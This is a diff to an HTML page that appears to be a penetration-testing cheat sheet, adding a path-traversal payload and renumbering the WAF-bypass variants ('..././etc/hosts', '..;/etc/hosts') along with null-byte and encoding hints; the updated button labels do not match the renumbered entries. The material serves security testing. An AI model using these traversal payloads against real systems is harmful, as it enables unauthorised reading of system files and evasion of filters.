@@ -44,20 +44,21 @@
 <p><b>DESCRIPTION: </b> Collection of commands to use when testing for path/directory traversal.
 
 <b>C1: </b><p id="DT01"><mark>../../../../etc/hosts</mark></p>
-
+<b>C2: </b><p id="DT02"><mark>..././.././..././..././..././..././..././..././etc/hosts</mark></p>
+	
 <b>try: </b>
 * <u>Nullbyte</u> | %00
 * <u>Encoding</u> 
 * <u>Double Encoding</u> 
 * <u>UTF-8 Encoding</u>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT01')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT02')">.C2.</button>
 
 <b><u>WAF bypass</u></b>
 
-<b>C2: </b><p id="DT02"><mark>..././etc/hosts</mark></p>
-<b>C3: </b><p id="DT03"><mark>..;/etc/hosts</mark></p>
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT03')">.C3.</button></p>
+<b>C3: </b><p id="DT03"><mark>..././etc/hosts</mark></p>
+<b>C4: </b><p id="DT04"><mark>..;/etc/hosts</mark></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT03')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT04')">.C3.</button></p>
 
 </details>
 
